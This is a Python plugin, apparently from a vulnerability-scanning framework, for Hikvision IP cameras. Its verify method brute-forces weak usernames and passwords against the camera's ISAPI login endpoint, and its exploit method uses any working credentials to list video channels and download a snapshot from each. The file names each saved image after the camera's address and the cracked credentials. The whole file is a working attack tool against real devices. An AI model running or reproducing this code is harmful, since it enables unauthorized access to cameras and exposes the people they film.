import requests
from requests.auth import HTTPDigestAuth
from xml.etree import ElementTree

from loguru import logger

from .base import POCTemplate


class HikvisionWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""

    def verify(self, ip, port=80):
        headers = self._get_headers()
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    r = requests.get(
                        url=self._get_url(ip, port, '/ISAPI/Security/userCheck'),
                        auth=(user, password),
                        timeout=self.config.timeout,
                        headers=headers,
                        verify=False,
                        proxies=proxies,
                    )
                    if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        headers = self._get_headers()
        proxies = self._get_proxies()
        channels = 1
        try:
            res = requests.get(
                self._get_url(ip, port, '/ISAPI/Image/channels'),
                auth=HTTPDigestAuth(user, password),
                headers=headers,
                timeout=self.config.timeout,
                verify=False,
                proxies=proxies,
            )
            channels = len(ElementTree.fromstring(res.text))
        except Exception as e:
            logger.error(e)

        res_list = []
        for channel in range(1, channels + 1):
            url = self._get_url(ip, port, f'/ISAPI/Streaming/channels/{channel}01/picture')
            img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
            res_list.append(
                self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
            )
        return sum(res_list)


POCTemplate.register_poc(HikvisionWeakPassword)
